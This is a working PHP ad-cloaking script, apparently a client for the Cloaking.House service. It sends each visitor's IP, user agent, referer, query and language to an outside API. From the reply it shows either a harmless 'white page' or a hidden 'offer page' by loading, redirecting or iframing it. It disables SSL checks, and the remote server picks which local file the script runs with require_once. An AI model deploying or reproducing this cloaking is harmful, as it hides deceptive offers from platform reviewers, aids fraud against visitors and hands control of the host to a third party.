<?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House


    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
    // Sincerely, Cloaking.House



    error_reporting(0);
    
    
    if (function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }


    if (version_compare(PHP_VERSION, '7.2', '<')) {
        exit('PHP 7.2 or higher is required.');
    }


    if ( ! extension_loaded('curl')) {
        exit('The cURL PHP extension is required.');
    }


    if ( ! extension_loaded('mbstring')) {
        exit('The mbstring PHP extension is required.');
    }


    if ( ! extension_loaded('openssl')) {
        exit('The OpenSSL PHP extension is required.');
    }


    if ( ! extension_loaded('json')) {
        exit('The JSON PHP extension is required.');
    }


    if ( ! extension_loaded('filter')) {
        exit('The Filter PHP extension is required.');
    }


    if ( ! ini_get('allow_url_fopen')) {
        exit('The "allow_url_fopen" setting must be enabled in php.ini.');
    }


    function get_real_ip_address()
    {
        $remote_addr        = ! empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
        $allowed_headers    = [
            'HTTP_CF_CONNECTING_IP',
            'HTTP_TRUE_CLIENT_IP',
            'HTTP_X_REAL_IP',
            'HTTP_X_FORWARDED_FOR'
        ];


        foreach ($allowed_headers AS $header) {
            if ( ! empty($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                foreach ($ips AS $ip) {
                    
                    $ip = trim($ip);
                    $ip = preg_replace('/:\d+$/', '', $ip);
                    $ip = trim($ip, '[]');

                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return trim($ip);
                    }
                }
            }
        }


        return $remote_addr;
    }


    function create_stream_context()
    {
        return stream_context_create([
            'ssl' => [
                'verify_peer' => FALSE, 
                'verify_peer_name' => FALSE
            ], 
            'http' => [
                'header' => 'User-Agent: ' . get_user_agent()
            ]
        ]);
    }


    function get_user_agent()
    {
        return ! empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }


    function get_referer()
    {
        return ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }


    function get_query_string()
    {
        return ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
    }


    function get_browser_language()
    {
        return ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
    }


    $request_data = [
        'label'         => '9be2e75a4a1d952d635093dca0f57b17', 
        'user_agent'    => get_user_agent(), 
        'referer'       => get_referer(), 
        'query'         => get_query_string(), 
        'lang'          => get_browser_language(),
        'ip_address'    => get_real_ip_address()
    ];
        

    $request_data   = http_build_query($request_data);
    $success_codes  = [200, 201, 204, 206];


    $ch = curl_init('https://cloakit.house/api/v1/check');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER  => TRUE,
        CURLOPT_CUSTOMREQUEST   => 'POST',
        CURLOPT_SSL_VERIFYPEER  => FALSE,
        CURLOPT_TIMEOUT         => 15,
        CURLOPT_POSTFIELDS      => $request_data
    ]);

    
    $result = curl_exec($ch);
    $info   = curl_getinfo($ch);
    curl_close($ch);


    if (isset($info['http_code']) && in_array($info['http_code'], $success_codes)) {
        $body = json_decode($result, TRUE);

        // Check for errors
        if ( ! empty($body['filter_type'])) {
            
            $messages = [
                'subscription_expired'  => 'Your Subscription Expired.',
                'flow_deleted'          => 'Flow Deleted.',
                'flow_banned'           => 'Flow Banned.',
            ];
        
            if (isset($messages[$body['filter_type']])) {
                exit($messages[$body['filter_type']]);
            }
        }
        

        if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {

            // Offer Page
            if ($body['filter_page'] == 'offer') {
                if ($body['mode_offer_page'] == 'loading') {
                    if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
                        echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, create_stream_context()));
                    } elseif (file_exists($body['url_offer_page'])) {
                        if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
                            echo file_get_contents($body['url_offer_page'], FALSE, create_stream_context());
                        } else {
                            require_once($body['url_offer_page']);
                        }
                    } else {
                        exit('Offer Page Not Found.');
                    }
                }

                if ($body['mode_offer_page'] == 'redirect') {
                    header('Location: ' . $body['url_offer_page'], TRUE, 302);
                    exit(0);
                }

                if ($body['mode_offer_page'] == 'iframe') {
                    echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe><style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; }</style>';
                    exit(0);
                }
            }

            // White Page
            if ($body['filter_page'] == 'white') {
                if ($body['mode_white_page'] == 'loading') {
                    if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
                        echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, create_stream_context()));
                    } elseif (file_exists($body['url_white_page'])) {
                        if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
                            echo file_get_contents($body['url_white_page'], FALSE, create_stream_context());
                        } else {
                            require_once($body['url_white_page']);
                        }
                    } else {
                        exit('White Page Not Found.');
                    }
                }

                if ($body['mode_white_page'] == 'redirect') {
                    header('Location: ' . $body['url_white_page'], TRUE, 302);
                    exit(0);
                }
            }
        } else {
            exit('Offer Page or White Page Not Found.');
        }
    } else {
        exit('Try again later or contact support.');
    }

?>